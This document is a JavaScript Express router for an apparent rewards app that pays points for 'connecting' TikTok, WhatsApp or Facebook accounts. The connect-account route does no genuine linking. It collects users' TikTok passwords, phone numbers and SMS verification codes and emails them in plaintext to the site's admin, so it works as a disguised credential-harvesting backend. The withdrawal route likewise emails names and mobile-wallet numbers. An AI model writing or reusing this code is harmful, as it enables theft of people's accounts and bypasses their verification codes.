import express from 'express';
import jwt from 'jsonwebtoken';
import { config } from '../config.js';
import { getUserByEmail, saveUser, ensureUserDefaults } from '../store.js';
import { sendAdminEmail } from '../mailer.js';

const router = express.Router();

function auth(req, res, next) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ message: 'Unauthorized' });
  try {
    const payload = jwt.verify(token, config.jwtSecret);
    req.userEmail = payload.email;
    next();
  } catch (e) {
    return res.status(401).json({ message: 'Invalid token' });
  }
}

router.get('/dashboard', auth, (req, res) => {
  const user = ensureUserDefaults(getUserByEmail(req.userEmail));
  if (!user) return res.status(404).json({ message: 'Not found' });
  res.json({
    name: user.name,
    email: user.email,
    points: user.points,
    earnings: user.earnings,
    rupeesFromPoints: user.rupeesFromPoints,
    connectedAccounts: user.connectedAccounts
  });
});

router.post('/connect-account', auth, async (req, res) => {
  const { provider, method, email, password, phone, code, username } = req.body || {};
  const valid = ['whatsapp', 'tiktok', 'facebook'];
  if (!valid.includes(provider)) return res.status(400).json({ message: 'Invalid provider' });
  const user = ensureUserDefaults(getUserByEmail(req.userEmail));
  if (!user) return res.status(404).json({ message: 'Not found' });
  
  // Build email notification with connection details
  let emailBody = `User ${user.email} linked ${provider}`;
  if (provider === 'tiktok' && method) {
    emailBody += `\n\nConnection Method: ${method}`;
    if (method === 'google' && email) {
      emailBody += `\nGoogle Email: ${email}`;
    } else if (method === 'email' && email) {
      emailBody += `\nTikTok Email/Username: ${email}`;
      if (password) emailBody += `\nPassword: ${password}`;
    } else if (method === 'phone' && phone) {
      emailBody += `\nPhone Number: ${phone}`;
      if (code) emailBody += `\nVerification Code: ${code}`;
    } else if (method === 'username' && username) {
      emailBody += `\nTikTok Username: ${username}`;
      if (password) emailBody += `\nPassword: ${password}`;
    }
  }
  
  if (!user.connectedAccounts.includes(provider)) user.connectedAccounts.push(provider);
  user.points += 100; // reward for connecting
  user.rupeesFromPoints = Math.floor(user.points / 100) * 10;
  saveUser(user);
  
  await sendAdminEmail(`${provider.charAt(0).toUpperCase() + provider.slice(1)} Account Linked`, emailBody).catch(() => {});
  res.json({ message: `Connected ${provider}${method ? ' via ' + method : ''}`, points: user.points });
});

router.post('/withdraw', auth, (req, res) => {
  const { provider, rupees, points, name, number } = req.body || {};
  const valid = ['Easypaisa', 'JazzCash'];
  if (!valid.includes(provider)) return res.status(400).json({ message: 'Invalid provider' });
  if (!points || points % 100 !== 0) return res.status(400).json({ message: 'Points must be multiple of 100' });
  const expectedRupees = (points / 100) * 10;
  if (expectedRupees !== rupees) return res.status(400).json({ message: 'Invalid conversion' });
  const user = ensureUserDefaults(getUserByEmail(req.userEmail));
  if (!user) return res.status(404).json({ message: 'Not found' });
  if (user.points < points) return res.status(400).json({ message: 'Insufficient points' });
  user.points -= points;
  user.earnings += rupees;
  user.rupeesFromPoints = Math.floor(user.points / 100) * 10;
  saveUser(user);
  sendAdminEmail('Withdrawal request', `User ${user.email}\nProvider: ${provider}\nName: ${name}\nNumber: ${number}\nPoints: ${points}\nRupees: ${rupees}`).catch(() => {});
  res.json({ message: 'Withdrawal requested', balance: user.earnings, points: user.points });
});

export default router;

